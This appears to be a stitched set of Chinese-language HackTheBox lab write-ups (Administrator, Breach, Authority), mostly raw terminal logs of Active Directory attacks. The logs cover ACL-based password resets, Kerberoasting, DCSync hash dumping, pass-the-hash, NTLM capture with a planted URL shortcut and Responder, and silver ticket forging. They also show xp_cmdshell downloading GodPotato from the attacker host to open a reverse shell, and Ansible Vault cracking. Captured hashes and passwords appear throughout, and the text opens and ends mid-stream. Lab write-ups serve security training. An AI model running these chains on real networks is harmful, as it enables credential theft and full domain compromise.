--path . ░▒▓ ✔  04:30:49 下午  [+] Connecting to LDAP server[+] Connected to LDAP serrverDumping schema: 2it [00:02, 1.09s/it]Generating lookuptable: 83it [00:04, 18.56it/s]Dumping SDs: [00:00<00:00, 20.76it/s][+] Bloodhound data saved to ./20260413T083743_Bloodhound.zip[+] Found 0 trusts
https://bloodhound.specterops.io/resources/edges/generic-all GenericAll:这通常被称为完全控制权限。该权限允许受托人按自身意愿任意操作目标对象所以可以更改该用户的密码查看用户olivia对内有什么权限，发现有 GenericAll，可以更改目标用户的密码再查看目标用户对内有什么权限发现MICHAEL用户可以更改BENJAMIN用户的密码    ~/htb/medium/Administrator ▓▒░ bloodyAD -d administrator.htb -u olivia -p 'ichliebedich' --host 10.129.211.186 set password michael 'xingguang123!' ░▒▓ 2 ✘  05:21:07 下午  [+] Password changed successfully! /htb/medium/Administrator ▓▒░ bloodyAD -d administrator.htb -u michael -p 'xingguang123!' --host 10.129.211.186 set password benjamin 'xingguang123!' ░▒▓ 1 ✘  05:31:18 下午  [+] Password changed successfully! 可以利用BENJAMIN用户    ~/htb/medium/Administrator ▓▒░ nxc ldap 10.129.211.186 -u benjamin -p 'xingguang123!' --groups ░▒▓ ✔  10s   05:42:06 下午  LDAP 10.129.211.186 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) LDAP 10.129.211.186 389 DC [+] administrator.htb\benjamin:xingguang123! LDAP 10.129.211.186 389 DC -Group- -Members- -Description- LDAP 10.129.211.186 389 DC Administrators 3 Administrators have complete and unrestricted access to the computer/domainLDAP 10.129.211.186 389 DC Users 3 Users are prevented from making accidental or intentional system-wide changes and can run most applicationsLDAP 10.129.211.186 389 DC Guests 2 Guests have the same access as members of the Users group by default, except for the Guest account which is further restrictedLDAP 10.129.211.186 389 DC Print Operators 0 Members can administer printers installed on domain controllersLDAP 10.129.211.186 389 DC Backup Operators 0 Backup Operators can override security restrictions for the sole purpose of backing up or restoring filesLDAP 10.129.211.186 389 DC Replicator 0 Supports file replication in a domainLDAP 10.129.211.186 389 DC Remote Desktop Users 0 Members in this group are granted the right to logon remotelyLDAP 10.129.211.186 389 DC Network Configuration Operators 0 Members in this group can have some administrative privileges to manage configuration of networking featuresLDAP 10.129.211.186 389 DC Performance Monitor Users 0 Members of this group can access performance counter data locally and remotelyLDAP 10.129.211.186 389 DC Performance Log Users 0 Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computerLDAP 10.129.211.186 389 DC Distributed COM Users 0 Members are allowed to launch, activate and use Distributed COM objects on this machine.LDAP 10.129.211.186 389 DC IIS_IUSRS 0 Built-in group used by Internet Information Services.LDAP 10.129.211.186 389 DC Cryptographic Operators 0 Members are authorized to perform cryptographic operations.LDAP 10.129.211.186 389 DC Event Log Readers 0 Members of this group can read event logs from local machineLDAP 10.129.211.186 389 DC Certificate Service DCOM Access 0 Members of this group are allowed to connect to Certification Authorities in the enterpriseLDAP 10.129.211.186 389 DC RDS Remote Access Servers 0 Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.LDAP 10.129.211.186 389 DC RDS Endpoint Servers 0 Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.LDAP 10.129.211.186 389 DC RDS Management Servers 0 Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.LDAP 10.129.211.186 389 DC Hyper-V Administrators 0 Members of this group have complete and unrestricted access to all features of Hyper-V.LDAP 10.129.211.186 389 DC Access Control Assistance Operators 0 Members of this group can remotely query authorization attributes and permissions for resources on this computer.LDAP 10.129.211.186 389 DC Remote Management Users 3 Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.LDAP 10.129.211.186 389 DC Storage Replica Administrators 0 Members of this group have complete and unrestricted access to all features of Storage Replica.LDAP 10.129.211.186 389 DC Domain Computers 0 All workstations and servers joined to the domainLDAP 10.129.211.186 389 DC Domain Controllers 0 All domain controllers in the domainLDAP 10.129.211.186 389 DC Schema Admins 1 Designated administrators of the schemaLDAP 10.129.211.186 389 DC Enterprise Admins 1 Designated administrators of the enterpriseLDAP 10.129.211.186 389 DC Cert Publishers 0 Members of this group are permitted to publish certificates to the directoryLDAP 10.129.211.186 389 DC Domain Admins 1 Designated administrators of the domainLDAP 10.129.211.186 389 DC Domain Users 0 All domain usersLDAP 10.129.211.186 389 DC Domain Guests 0 All domain guestsLDAP 10.129.211.186 389 DC Group Policy Creator Owners 1 Members in this group can modify group policy for the domainLDAP 10.129.211.186 389 DC RAS and IAS Servers 0 Servers in this group can access remote access properties of usersLDAP 10.129.211.186 389 DC Server Operators 0 Members can administer domain serversLDAP 10.129.211.186 389 DC Account Operators 0 Members can administer domain user and group accountsLDAP 10.129.211.186 389 DC Pre-Windows 2000 Compatible Access 1 A backward compatibility group which allows read access on all users and groups in the domainLDAP 10.129.211.186 389 DC Incoming Forest Trust Builders 0 Members of this group can create incoming, one-way trusts to this forestLDAP 10.129.211.186 389 DC Windows Authorization Access Group 1 Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objectsLDAP 10.129.211.186 389 DC Terminal Server License Servers 0 Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usageLDAP 10.129.211.186 389 DC Allowed RODC Password Replication Group 0 Members in this group can have their passwords replicated to all read-only domain controllers in the domainLDAP 10.129.211.186 389 DC Denied RODC Password Replication Group 8 Members in this group cannot have their passwords replicated to any read-only domain controllers in the domainLDAP 10.129.211.186 389 DC Read-only Domain Controllers 0 Members of this group are Read-Only Domain Controllers in the domainLDAP 10.129.211.186 389 DC Enterprise Read-only Domain Controllers 0 Members of this group are Read-Only Domain Controllers in the enterpriseLDAP 10.129.211.186 389 DC Cloneable Domain Controllers 0 Members of this group that are domain controllers may be cloned.LDAP 10.129.211.186 389 DC Protected Users 0 Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.LDAP 10.129.211.186 389 DC Key Admins 0 Members of this group can perform administrative actions on key objects within the domain.LDAP 10.129.211.186 389 DC Enterprise Key Admins 0 Members of this group can perform administrative actions on key objects within the forest.LDAP 10.129.211.186 389 DC DnsAdmins 0 DNS Administrators GroupLDAP 10.129.211.186 389 DC DnsUpdateProxy 0 DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).LDAP 10.129.211.186 389 DC Share Moderators 1    ~/htb/medium/Administrator ▓ 用benjingming的账号登陆ftp发现一个密码管理器，用hash破解其密码得到密码为tekieromucho    ~/htb/medium/Administrator ▓▒░ pwsafe2john Backup.psafe3 > safe.hash ░▒▓ ✔  05:46:34 下午     ~/htb/medium/Administrator ▓▒░ ls ░▒▓ ✔  05:47:50 下午  20260413T083743_Bloodhound.zip Backup.psafe3 safe.hash    ~/htb/medium/Administrator ▓▒░ john --wordlist=/home/zss/rockyou.txt safe.hash ░▒▓ ✔  05:47:52 下午  Using default input encoding: UTF-8Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])Cost 1 (iteration count) is 2048 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statustekieromucho (Backu) 1g 0:00:00:00 DONE (2026-04-13 17:48) 3.448g/s 21186p/s 21186c/s 21186C/s newzealand..iheartyouUse the "--show" option to display all of the cracked passwords reliablySession completed. 发现三个用户以及密码，经过尝试，发现只有Emily用户可以用evil登陆能拿到user.txt dcsync查看Emily的权限 发现该用户能有Genricwrite，如果对用户对象拥有可写属性权限，而其中又包含 servicePrincipalName，就可以构造定向 Kerberoasting获取ethan的TGT，并成功爆破出密码。 ~/htb/medium/Administrator ▓▒░ nxc ldap 10.129.211.186 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --query "(sAMAccountName=ethan)" distinguishedName ░▒▓ 1 ✘  08:13:12 下午  LDAP 10.129.211.186 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) LDAP 10.129.211.186 389 DC [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb LDAP 10.129.211.186 389 DC [+] Response for object: CN=Ethan Hunt,CN=Users,DC=administrator,DC=htbLDAP 10.129.211.186 389 DC distinguishedName CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb 先确认 Ethan 的 DN    ~/htb/medium/Administrator ▓▒░ bloodyAD -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.211.186 msldap addspn 'CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb' 'User/EthanService'SPN added! 给 Ethan 增加一个临时 SPN，请求 TGS 哈希   ~/htb/medium/Administrator ▓▒░ python3 /home/zss/.local/bin/GetUserSPNs.py administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.211.186 -request -outputfile kerb.hashImpacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ----- -------- -------------------------- --------- ----------User/EthanService ethan 2024-10-13 04:52:14.117811 <never> [-] CCache file is not found. Skipping... 用hashcat破解得到凭证:ethan:limpbizkitethan具有DCSync权限。利用ethan，可以得到Administrators的hash。  ~/htb/medium/Administrator ▓▒░ python3 /home/zss/.local/bin/secretsdump.py administrator.htb/ethan:'limpbizkit'@10.129.211.186 -just-dc-user administrator ░▒▓ 1 ✘  30s   03:27:37 上午  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2Administrator:des-cbc-md5:403286f7cdf18385[*] Cleaning up... 拿到管理员hash，进行哈希传递 evil-winrm -i dc.administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 179.80 seconds NTLMv2可以发现机器的FQDN为BREACHDC.breach.vl域控制器,同步时间 sudo ntpdate $ip nxc smb "$ip" -u 'guest' -p '' --shares ░▒▓ ✔  07:58:01 下午  SMB 10.129.234.27 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)SMB 10.129.234.27 445 BREACHDC [+] breach.vl\guest: SMB 10.129.234.27 445 BREACHDC [*] Enumerated sharesSMB 10.129.234.27 445 BREACHDC Share Permissions RemarkSMB 10.129.234.27 445 BREACHDC ----- ----------- ------SMB 10.129.234.27 445 BREACHDC ADMIN$ Remote AdminSMB 10.129.234.27 445 BREACHDC C$ Default shareSMB 10.129.234.27 445 BREACHDC IPC$ READ Remote IPCSMB 10.129.234.27 445 BREACHDC NETLOGON Logon server shareSMB 10.129.234.27 445 BREACHDC share READ,WRITE SMB 10.129.234.27 445 BREACHDC SYSVOL Logon server shareSMB 10.129.234.27 445 BREACHDC Users READ    ~ ▓▒░ 发现guest用户拥有share文件夹的读写权限，可以利用NTLM捕获捕获 NTLMv2 hash → 破解密码 /m/Breach ▓▒░ smbclient //$ip/share -N ░▒▓ INT ✘  08:07:00 下午  Try "help" to get a list of possible commands.smb: \> ls . D 0 Mon Mar 9 19:58:27 2026 claire.pope D 0 Thu Feb 17 19:21:35 2022 diana.pope D 0 Thu Feb 17 19:21:19 2022 julia.wong D 0 Thu Apr 17 08:38:12 2025 进入transfer文件夹，发现几个人名，写一个URL文件放入其中 [InternetShortcut]URL=http://example.comIconFile=\\10.10.16.31\test.ico>>>> IconIndex=1 sudo responder -I tun0 ░▒▓ INT ✘  09:11:35 下午  [sudo] zss 的密码： __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__|[+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF][+] Servers: HTTP server <lgaffie@secorizon.com>[*] To sponsor Responder: https://paypal.me/PythonResponder[+] Listening for events...[SMB] NTLMv2-SSP Client : 10.129.234.27[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong[SMB] NTLMv2-SSP Hash : Julia.Wong::BREACH:fdd96b1e72982708:B7E5052142F335F39B5FAD8FD16E01D9:[*] Skipping previously captured hash for BREACH\Julia.Wong[*] Skipping previously captured hash for BREACH\Julia.Wong[*] Skipping previously captured hash for BREACH\Julia.Wong[*] Skipping previously captured hash for BREACH\Julia.Wong 抓取到hash值，然后利用hashcat进行破解 ~/htb/medium/Breach ▓▒░ hashcat -m 5600 hash.txt /home/zss/rockyou.txt --force ░▒▓ 255 ✘  09:26:36 下午  hashcat (v6.2.6) startingYou have enabled --force to bypass dangerous warnings and errors!This can hide serious problems and should only be done when debugging.Do not report hashcat issues encountered when using --force.OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]====================================================================================================================================================* Device #1: cpu-haswell-Intel(R) Core(TM) i7-14650HX, 1424/2912 MB (512 MB allocatable), 2MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache hit:* Filename..: /home/zss/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385JULIA.WONG::BREACH:fdd96b1e72982708:b7e5052142f335f39b5fad8fd16e01d9::Computer1 破解出明文密码 smbclient //$ip/share -U "julia.wong%Computer1"Try "help" to get a list of possible commands.smb: \> ls . D 0 Mon Sep 8 19:13:00 2025 .. DHS 0 Tue Sep 9 18:35:32 2025 finance D 0 Thu Feb 17 19:19:34 2022 software D 0 Thu Feb 17 19:19:12 2022 transfer D 0 Mon Sep 8 18:13:44 2025 7863807 blocks of size 4096. 1511437 blocks availablesmb: \> cd transfersmb: \transfer\> ls . D 0 Mon Sep 8 18:13:44 2025 .. D 0 Mon Sep 8 19:13:00 2025 claire.pope D 0 Thu Feb 17 19:21:35 2022 diana.pope D 0 Thu Feb 17 19:21:19 2022 julia.wong D 0 Thu Apr 17 08:38:12 2025 7863807 blocks of size 4096. 1556796 blocks availablesmb: \transfer\> smb: \transfer\> cd julia.wongsmb: \transfer\julia.wong\> ls . D 0 Thu Apr 17 08:38:12 2025 .. D 0 Mon Sep 8 18:13:44 2025 user.txt A 32 Thu Apr 17 08:38:22 2025 7863807 blocks of size 4096. 1556796 blocks availablesmb: \transfer\julia.wong\> get user.txtgetting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)smb: \transfer\julia.wong\> 得到user.txt MSSQL Exploitation得到julia.wong的凭据，用bloodad来进行信息收集 /h/m/Breach ▓▒░ bloodhound-python -u 'julia.wong' -p 'Computer1' -d breach.vl -ns 10.129.247.65 -c AllINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)INFO: Found AD domain: breach.vlINFO: Getting TGT for userINFO: Connecting to LDAP server: breachdc.breach.vlINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: breachdc.breach.vlINFO: Found 15 usersINFO: Found 54 groupsINFO: Found 2 gposINFO: Found 2 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: BREACHDC.breach.vlWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.INFO: Done in 00M 34S 用bloodhound进行分析,查看域中的kerberoastable 账户,发现svc_mssql用户用Julia.Wong的用户对域内的其他用户进行 kerberoasting 攻击    ~ ▓▒░ impacket-GetUserSPNs breach.vl/julia.wong:Computer1 -dc-ip $ip -requestImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------------------- --------- -------- -------------------------- -------------------------- ----------MSSQLSvc/breachdc.breach.vl:1433 svc_mssql 2022-02-17 18:43:08.106169 2026-03-13 22:26:02.184179 [-] CCache file is not found. Skipping...$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$f0a175f1a7f759bde97042d0aab119c9$ 得到该用户的hash,用hashcat破解    ~/h/m/Breach ▓▒░ hashcat -m 13100 hashsq.txt /home/zss/rockyou.txt ░▒▓ ✔  3s   09:05:27 下午  hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]====================================================================================================================================================* Device #1: cpu-haswell-Intel(R) Core(TM) i7-14650HX, 1424/2912 MB (512 MB allocatable), 2MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache hit:* Filename..: /home/zss/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$f0a175f1a7f759bde97042d0aab119c9$:Trustno1 Silver Ticket有了svc_mssql 账号,我们可以用来创建银票银票是一种伪造的 Kerberos 服务票据（TGS），它是使用服务账户的 NTLM 哈希创建的银票针对特定的服务,所以我们可以制作票据服务SPN为MSSQLSvc/breachdc.breach.vl:1433域sid为S-1-5-21-2330692793-3312915120-706255856-1115svc_mssql的nt哈希 python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Trustno1".encode("utf-16le")).digest()).decode())' impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl:1433 -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain breach.vl -user-id 500 Administratorexport KRB5CCNAME=Administrator.ccacheimpacket-mssqlclient -k -no-pass BREACHDC.breach.vlEXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 打开xm，开启命令执行的功能 > EXEC xp_cmdshell 'systeminfo';output --------------------------------------------------------------------------------------------------------------- NULL Host Name: BREACHDC OS Name: Microsoft Windows Server 2022 Datacenter OS Version: 10.0.20348 N/A Build 20348 OS Manufacturer: Microsoft Corporation OS Configuration: Primary Domain Controller OS Build Type: Multiprocessor Free Registered Owner: EC2 Registered Organization: Amazon.com Product ID: 00454-70295-72962-AA769 Original Install Date: 2/10/2022, 9:11:02 AM System Boot Time: 3/13/2026, 2:23:34 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 11/12/2020 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC) Coordinated Universal Time Total Physical Memory: 4,095 MB Available Physical Memory: 2,420 MB Virtual Memory: Max Size: 6,271 MB Virtual Memory: Available: 4,583 MB Virtual Memory: In Use: 1,688 MB Page File Location(s): C:\pagefile.sys Domain: breach.vl Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 2 DHCP Enabled: Yes DHCP Server: 10.129.0.1 IP address(es) [01]: 10.129.247.65 [02]: fe80::ec74:4031:e29d:f662 [03]: dead:beef::ec74:4031:e29d:f662 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. NULL 查看系统的信息 SQL (BREACH\Administrator dbo@master)> EXEC xp_cmdshell 'whoami /all'; PRIVILEGES INFORMATION ---------------------- NULL Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeMachineAccountPrivilege Add workstations to domain Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled 查看用户的权限，可以发现用户有SeImpersonatePrivilege的权限SeImpersonatePrivilege 允许程序模拟另一个用户https://github.com/BeichenDream/GodPotato/ SQL (BREACH\Administrator dbo@master)> EXEC xp_cmdshell 'powershell -c "iwr http://10.10.16.31/GodPotato-NET4.exe -OutFile C:\programdata\gp.exe"'; nc -lvp 6666#弹shell拿到flagEXEC xp_cmdshell 'C:\programdata\gp.exe -cmd "powershell -e "'

entry.title: HackTheBox - Authority
entry.content:
一.信息收集扫描端口    ~ ▓▒░ nmap -p- -sV --min-rate=10000 $ip ░▒▓ ✔  08:12:33 下午  Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-16 20:15 CSTWarning: 10.129.210.230 giving up on port because retransmission cap hit (10).Nmap scan report for 10.129.210.230Host is up (0.19s latency).Not shown: 56696 closed tcp ports (reset), 8810 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-16 16:16:22Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)8443/tcp open ssl/http Apache Tomcat (language: en)9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49673/tcp open msrpc Microsoft Windows RPC49690/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049691/tcp open msrpc Microsoft Windows RPC49693/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPC49703/tcp open msrpc Microsoft Windows RPC49714/tcp open msrpc Microsoft Windows RPC63182/tcp open msrpc Microsoft Windows RPC63228/tcp open msrpc Microsoft Windows RPCService Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 143.37 seconds 8443端口为http，进去发现是https，web服务是pwm，暂时没方向,搜索发现是一个面向 LDAP 目录的开源密码自助服务应用，添加到/etc/hosts中 10.129.164.154 authority.htb https://github.com/pwm-project/pwm 可以在github上找到这个开源项目 ▓▒░ nxc smb 10.129.210.230 -u guest -p '' --shares ░▒▓ ✔  2m 23s   08:17:38 下午  SMB 10.129.210.230 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)SMB 10.129.210.230 445 AUTHORITY [+] authority.htb\guest: SMB 10.129.210.230 445 AUTHORITY [*] Enumerated sharesSMB 10.129.210.230 445 AUTHORITY Share Permissions RemarkSMB 10.129.210.230 445 AUTHORITY ----- ----------- ------SMB 10.129.210.230 445 AUTHORITY ADMIN$ Remote AdminSMB 10.129.210.230 445 AUTHORITY C$ Default shareSMB 10.129.210.230 445 AUTHORITY Department Shares SMB 10.129.210.230 445 AUTHORITY Development READ SMB 10.129.210.230 445 AUTHORITY IPC$ READ Remote IPCSMB 10.129.210.230 445 AUTHORITY NETLOGON Logon server share SMB 10.129.210.230 445 AUTHORITY SYSVOL Logon server share 用guest进行枚举发现Development可读，查看一下,发现刚刚的PWM服务 smbclient //10.129.210.230/Development -U 'authority.htb\guest' ░▒▓ ✔  31s   08:41:51 下午  Password for [AUTHORITY.HTB\guest]:Try "help" to get a list of possible commands.smb: \> ls . D 0 Fri Mar 17 21:20:38 2023 .. D 0 Fri Mar 17 21:20:38 2023 Automation D 0 Fri Mar 17 21:20:40 2023 5888511 blocks of size 4096. 1342682 blocks availablesmb: \> cd Automationsmb: \Automation\> ls . D 0 Fri Mar 17 21:20:40 2023 .. D 0 Fri Mar 17 21:20:40 2023 Ansible D 0 Fri Mar 17 21:20:50 2023 5888511 blocks of size 4096. 1374500 blocks availablesmb: \Automation\> cd Ansiblesmb: \Automation\Ansible\> ls . D 0 Fri Mar 17 21:20:50 2023 .. D 0 Fri Mar 17 21:20:50 2023 ADCS D 0 Fri Mar 17 21:20:48 2023 LDAP D 0 Fri Mar 17 21:20:48 2023 PWM D 0 Fri Mar 17 21:20:48 2023 SHARE D 0 Fri Mar 17 21:20:48 2023 5888511 blocks of size 4096. 1374492 blocks availablesmb: \Automation\Ansible\> cd PWMsmb: \Automation\Ansible\PWM\> ls . D 0 Fri Mar 17 21:20:48 2023 .. D 0 Fri Mar 17 21:20:48 2023 ansible.cfg A 491 Thu Sep 22 13:36:58 2022 ansible_inventory A 174 Thu Sep 22 06:19:32 2022 defaults D 0 Fri Mar 17 21:20:48 2023 handlers D 0 Fri Mar 17 21:20:48 2023 meta D 0 Fri Mar 17 21:20:48 2023 README.md A 1290 Thu Sep 22 13:35:58 2022 tasks D 0 Fri Mar 17 21:20:48 2023 templates D 0 Fri Mar 17 21:20:48 2023 5888511 blocks of size 4096. 1378341 blocks availablesmb: \Automation\Ansible\PWM\> cd taskssmb: \Automation\Ansible\PWM\tasks\> ls . D 0 Fri Mar 17 21:20:48 2023 .. D 0 Fri Mar 17 21:20:48 2023 main.yml A 1832 Thu Sep 22 10:41:48 2022 发现一个文件，发现main.yaml /htb/AD/Authority ▓▒░ cat main.yml ░▒▓ ✔  03:18:01 上午  ---pwm_run_dir: "{{ lookup('env', 'PWD') }}"pwm_hostname: authority.htb.corppwm_http_port: "{{ http_port }}"pwm_https_port: "{{ https_port }}"pwm_https_enable: truepwm_require_ssl: falsepwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531ldap_uri: ldap://127.0.0.1/ldap_base_dn: "DC=authority,DC=htb"ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764% 查看defaults里的main.yml,下载到本地，发现多个Ansible Vault加密， python3 /usr/share/john/ansible2john.py hash.txt > vault.hash 用ansible2John爆破密码得到Ansible Vault的密码 !@#$%^&* - hosts: localhost gather_facts: false tasks: - debug: var: pwm_admin_login - debug: var: pwm_admin_password - debug: var: ldap_admin_password 得到密码，尝试一下网站，登陆成功发现可以进行ldap连接，我们kali上起监听 sudo nc -lvnp 389并同时抓包 sudo tcpdump -i tun0 -nn -s0 -A port 389 sudo nc -lvnp 389让对方向我们做 